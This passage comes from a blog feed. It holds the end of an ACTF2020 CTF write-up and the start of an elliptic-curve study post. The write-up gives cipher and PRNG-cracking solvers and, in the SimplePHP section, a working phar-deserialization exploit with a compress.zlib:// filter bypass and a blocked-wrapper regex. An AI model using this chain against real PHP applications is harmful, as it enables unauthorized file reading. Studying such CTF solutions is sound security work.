encrypt(iv,message)</span><br></pre></td></tr></table></figure><p>MTP老套路了- -</p><h4 id="exp-5">[exp]</h4><p>jupyter里手操，而且本题中MTP不论是用猜测空格还是字频分析都存在一定误差，需手动调整- -老毛病了（估计也有可能是我一直用的频率表不太对</p><h3 id="naive-aes">naive aes</h3><h4 id="题解分析-6">[题解分析]</h4><p>考察简单的S盒及P盒逆向算法</p><h4 id="exp-6">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(<span class="string">"actf.node.csuaurora.org"</span>, <span class="string">"28627"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexpad</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    numZeros = <span class="number">8</span> - len(hexBlock)</span><br><span class="line">    <span class="keyword">return</span> numZeros * <span class="string">"0"</span> + hexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_substitute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    substitutedHexBlock = <span class="string">""</span></span><br><span class="line">    substitution = [<span class="number">8</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> hexDigit <span class="keyword">in</span> hexBlock:</span><br><span class="line">        newDigit = substitution.index(int(hexDigit, <span class="number">16</span>))</span><br><span class="line">        substitutedHexBlock += hex(newDigit)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> substitutedHexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    inv_permutation = [<span class="number">22</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">29</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">17</span>,</span><br><span class="line">                      <span class="number">28</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">30</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">10</span>]</span><br><span class="line">    block = int(hexBlock, <span class="number">16</span>)</span><br><span class="line">    permutedBlock = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        bit = (block &amp; (<span class="number">1</span> &lt;&lt; i)) &gt;&gt; i</span><br><span class="line">        permutedBlock |= bit &lt;&lt; inv_permutation[i]</span><br><span class="line">    <span class="keyword">return</span> hexpad(hex(permutedBlock)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_round</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    numBlocks = len(hexMessage) // <span class="number">8</span></span><br><span class="line">    permutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        permutedHexMessage += inv_permute(hexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    substitutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        substitutedHexMessage += inv_substitute(permutedHexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    <span class="keyword">return</span> substitutedHexMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        hexMessage = dec_round(hexMessage)</span><br><span class="line">    <span class="keyword">return</span> unhexlify(hexMessage.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    hexMessage = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(decrypt(hexMessage))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="tiny_prng0">tiny_PRNG0</h3><h4 id="题解分析-7">[题解分析]</h4><p>MT predict，也是经典考点了，题目能得到无限长的随机数流，取624个即可.</p><p>可以用自己写的脚本<a href="https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mt---predictbacktrace">https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mt---predictbacktrace</a>，也可以用randcrack.</p><h4 id="exp-7">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">Rand = RandCrack()</span><br><span class="line">data = [...]</span><br><span class="line"><span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">    Rand.submit(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(data)):</span><br><span class="line">    Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="keyword">print</span> Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br></pre></td></tr></table></figure><p>预测成功一次即获得flag.</p><h3 id="tiny_prng1">tiny_PRNG1</h3><h4 id="题解分析-8">[题解分析]</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> s[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint64_t</span> <span class="title">rotl</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint64_t</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">next</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> s0 = s[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">uint64_t</span> s1 = s[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> result = s0 + s1;</span><br><span class="line"></span><br><span class="line">  s1 ^= s0;</span><br><span class="line">  s[<span class="number">0</span>] = rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>);</span><br><span class="line">  s[<span class="number">1</span>] = rotl(s1, <span class="number">36</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">s[<span class="number">0</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">5</span>);</span><br><span class="line">s[<span class="number">1</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">13</span>);</span><br><span class="line">assert((<span class="string">"Flag length correct"</span>, <span class="built_in">strlen</span>(flag) == <span class="number">22</span>));</span><br></pre></td></tr></table></figure><p>next的re很简单，但输出只是s0+s1，推了挺长一段时间觉得挺麻烦的，就尝试用z3直接求解，前连续两个res即可确定种子.</p><p>拿到flag以后发现是xoroshiro128plus- -</p><h4 id="exp-8">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mask = <span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotl</span><span class="params">(x, k)</span>:</span></span><br><span class="line"><span class="keyword">return</span> ((x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k))) &amp; mask</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(s0, s1)</span>:</span></span><br><span class="line">s1 ^= s0</span><br><span class="line"><span class="keyword">return</span> (rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>)) &amp; mask, rotl(s1, <span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">fl, fr = BitVecs(<span class="string">'fl fr'</span>, <span class="number">64</span>)</span><br><span class="line">s0, s1 = fl, fr</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> argv[<span class="number">1</span>:]:</span><br><span class="line">solver.add((s0 + s1) &amp; mask == int(res, <span class="number">0</span>))</span><br><span class="line">s0, s1 = next(s0, s1)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> solver.check() != sat:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">flag = solver.model()</span><br><span class="line">flag_left, flag_right = flag[fl].as_long(), flag[fr].as_long()</span><br><span class="line">print(<span class="string">"[&#123;&#125;] - &#123;&#125; | &#123;&#125;"</span>.format(cnt, long_to_bytes(flag_left), long_to_bytes(flag_right)))</span><br><span class="line">solver.add(And(fl != flag[fl], fr != flag[fr]))</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># [1] - b'rihsorox' | b'sulp821o'</span></span><br></pre></td></tr></table></figure><h2 id="misc">Misc</h2><h3 id="签到">签到</h3><p>公众号回复</p><h3 id="神奇的时钟">神奇的时钟</h3><h4 id="题解分析-9">[题解分析]</h4><p>hint给了新加坡樟宜机场，查了下时钟墙就知道怎么回事了- -</p><p>csv文件中给出的均为总秒数，用matplotlib绘图即可</p><p><img src= "/img/loading.gif" data-src="/2020/06/06/WriteUp-ACTF2020/image-20200604195637685.png"></p><h4 id="exp-9">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.lines <span class="keyword">import</span> Line2D</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = [[...],[...],...]</span><br><span class="line"><span class="comment"># (min, sec)</span></span><br><span class="line">params = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> data:</span><br><span class="line">    param = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        param.append(((col % <span class="number">3600</span>) // <span class="number">60</span>, col % <span class="number">60</span>))</span><br><span class="line">    params.append(param)</span><br><span class="line"><span class="comment"># (delta_x, delta_y)</span></span><br><span class="line">delta = &#123;<span class="number">0</span>: (<span class="number">0</span>, <span class="number">0.5</span>), <span class="number">7</span>: (<span class="number">0.353</span>, <span class="number">0.354</span>), <span class="number">10</span>: (<span class="number">0.433</span>, <span class="number">0.25</span>), <span class="number">15</span>: (<span class="number">0.5</span>, <span class="number">0</span>), <span class="number">20</span>: (<span class="number">0.433</span>, <span class="number">-0.25</span>), <span class="number">23</span>: (<span class="number">0.353</span>, <span class="number">-0.354</span>), <span class="number">30</span>: (<span class="number">0</span>, <span class="number">-0.5</span>), <span class="number">37</span>: (<span class="number">-0.353</span>, <span class="number">-0.354</span>), <span class="number">40</span>: (<span class="number">-0.433</span>, <span class="number">-0.25</span>), <span class="number">45</span>: (<span class="number">-0.5</span>, <span class="number">0</span>), <span class="number">50</span>: (<span class="number">-0.433</span>, <span class="number">0.25</span>), <span class="number">53</span>: (<span class="number">-0.353</span>, <span class="number">0.354</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># draw</span></span><br><span class="line">figure, ax = plt.subplots()</span><br><span class="line">ax.set_xlim(left=<span class="number">0</span>, right=<span class="number">115</span>)</span><br><span class="line">ax.set_ylim(bottom=<span class="number">0</span>, top=<span class="number">15</span>)</span><br><span class="line">y = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> params:</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        dx, dy = delta[col[<span class="number">0</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'blue'</span>))</span><br><span class="line">        dx, dy = delta[col[<span class="number">1</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'red'</span>))</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    y -= <span class="number">1</span></span><br><span class="line">plt.plot()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="web">Web</h2><h3 id="simplephp">SimplePHP</h3><h4 id="题解分析-10">[题解分析]</h4><p>退坑web手的心酸操作（x</p><p>考察phar反序列化，<code>highlight_file</code>和<code>file_exists</code>都能触发，但有做<code>strtolower(substr($file,0,4))=='phar' || strtolower(substr($high_light,0,4))=='phar'</code>的黑名单判断，因此用zlib绕过.</p><p>poc链：<code>__destruct(Sh0w) =&gt; __call(S6ow) =&gt; __get(S6ow) =&gt; file_get(S6ow) =&gt; __toString(Show)</code>.</p><p>实现任意文件读取（存在以下黑名单<code>preg_match("/http|https|file:|gopher|dict|zip|php|\.\./i", $this-&gt;source)</code>），但读取flag只需<code>file_get_contents("/flag")</code>即可.</p><h4 id="exp-10">[exp]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file, $params)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = $params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$params = <span class="keyword">array</span>();</span><br><span class="line">$params[<span class="string">"_show"</span>] = <span class="string">"file_get"</span>;</span><br><span class="line">$file = <span class="keyword">new</span> Show(<span class="string">"/flag"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Sh0w(<span class="keyword">new</span> S6ow($file, $params));</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"SimplePHP.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"SimplePHP.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将SimplePHP.phar后缀名修改为.jpg上传，再包含即可.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//actf.node.csuaurora.org:28726/file.php?high_light=compress.zlib://phar://upload/9ee4f116e740e2207acbdfc5a78c12cd.jpg&amp;file=upload/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Aurora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learning of Elliptic Curve</title>
      <link href="/2020/05/11/Learning-of-Elliptic-Curve/"/>
      <url>/2020/05/11/Learning-of-Elliptic-Curve/</url>
      
        <content type="html"><![CDATA[<h2 id="preface">Preface</h2><p>椭圆曲线密码相关咕了挺久了ojz，也没系统做过总结，谨以此文作为学习记录，以便日后翻阅</p><p>ps: 各种实验ddl期间- -不定期更新(🕊)</p><h2 id="basis">Basis</h2><h3 id="elliptic-curve-in-finite-field">1.1 Elliptic Curve in Finite Field</h3><p>设p为一素数，n为正整数，<span class="math inline">\(q=p^{n}\)</span>，则<span class="math inline">\(F_{q}\)</span>上的Weierstrass方程式 <span class="math display">\[y^{2}+a_{1}xy+a_{3}y=x^{3}+a_{2}x^{2}+a_{4}x+a_{6},\quad a_{i}\in F_{q}\]</span> 决定的曲线再添加上无穷远点后，即得到射影平面<span class="math inline">\(P^{2}(\bar{F_{q}})\)</span>上的一条曲线E，若非奇异，则称其为一条椭圆曲线，当且仅当<span class="math inline">\(\Delta\neq 0\)</span>.</p><p>给定一条<span class="math inline">\(F_{q}\)</span>上的椭圆曲线E，及其上任意两点P和Q，连接P和Q的直线与E交于第三个点R，由R和无穷远点O可决定一直线，该直线与E的第三个交点定义为P和Q的和，记作<span class="math inline">\(P\oplus Q\)</span>. 且易证得该加法定义下满足阿贝尔群.</p><p>给出具体的加法公式如下：</p><p>设<span class="math inline">\(P_{1}+P_{2}=P_{3},\quad P_{i}=(x_{i},y_{i})\in E.\)</span></p><ol type="a"><li><p>若<span class="math inline">\(x_{1}=x_{2},y_{1}+y_{2}+a_{1}x_{1}+a_{3}\)</span>，则<span class="math inline">\(P_{1}+P_{2}=O\)</span>，否则</p></li><li><p>一般性如图所示：</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/05/11/Learning-of-Elliptic-Curve/QQ图片20200511171504.jpg"></p><p>但要注意的是，<strong>在<span class="math inline">\(F_{q}\)</span>上，该直线PQ不同于实数域</strong>，可表示为 <span class="math display">\[ax+by+c\equiv 0(mod\ q)\]</span> 另外，可以证明，<span class="math inline">\(p\neq 2,3\)</span>时，每一条<span class="math inline">\(F_{q}\)</span>上的椭圆曲线都同构于 <span class="math display">\[E:y^{2}=x^{3}+ax+b,\quad a,b\in F_{q}\]</span> [Hasse定理] - 如果<span class="math inline">\(E_{p}(a,b):y^{2}=x^{3}+ax+b\ (4a^{3}+27b^{2}\neq 0)\)</span>是定义在<span class="math inline">\(F_{p}\)</span>上的椭圆曲线，则有 <span class="math display">\[|\#E-(p+1)|\leq 2\sqrt{p}\]</span> 注：特别的，在<span class="math inline">\(p\equiv 3(mod\ 4)\)</span>时， <span class="math display">\[\#E_{p}(a,0)=p+1.\]</span></p><p>在ECC等体制中寻找基点的算法：</p><ul><li>计算椭圆曲线E的阶 N(#E).</li><li>选择一子群的阶n（n为素数），辅因子<span class="math inline">\(h=\frac{N}{n}\)</span>.</li><li>在E上选择一随机点P，如果G=hp为0，则重新选取P，此时G即为基点（阶为n）.</li></ul><h2 id="attacking-the-discrete-logarithm-problem">Attacking the Discrete Logarithm Problem</h2><p>在进入ECDLP前，我们首先介绍DLP及各种可用的攻击方法（没跑题- -拍打.jpg）：</p><h3 id="baby-step-giant-step-algorithm">2.1 Baby-Step, Giant-Step Algorithm</h3><h4 id="theorem">[Theorem]</h4><p>北上广深算法- -算法优化思路可看作中间相遇，复杂度<span class="math inline">\(O(\sqrt{n})\)</span>.</p><p>假设<span class="math inline">\(\alpha^{x}=\beta\)</span>，G是n阶循环群，令<span class="math inline">\(m=\lceil \sqrt{n}\rceil\)</span>. 则可以将x表示为<span class="math inline">\(im+j(0\leq i,j\leq m)\)</span>. 有 <span class="math display">\[\beta=\alpha^{x}=\alpha^{im+j}=\alpha^{im}\alpha^{j}\\\beta(\alpha^{-m})^{i}=\alpha^{j}\]</span> 先遍历<span class="math inline">\(j\in [0,m]\)</span>，存储对应的所有<span class="math inline">\(\alpha^{j}\)</span>. 再去遍历<span class="math inline">\(i\in [0,m]\)</span>，找到碰撞即可.</p><h4 id="code">[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = ceil(sqrt(p - <span class="number">1</span>))</span><br><span class="line">    S = &#123;pow(alpha, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = pow(alpha, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="pollards-ρ-method">2.2 Pollard's ρ-Method</h3><h4 id="theorem-1">[Theorem]</h4><p>和大数分解的Pollard's ρ有类似之处（生日悖论）</p><p>假设<span class="math inline">\(\alpha^{x}=\beta\)</span>，G是n阶循环群，将其划分为<code>psize</code>个等价类，<span class="math inline">\(S_{1},S_{2},...,S_{psize}\)</span>. 接着再定义G上的序列<span class="math inline">\(\{x_i\}\)</span>，每个<span class="math 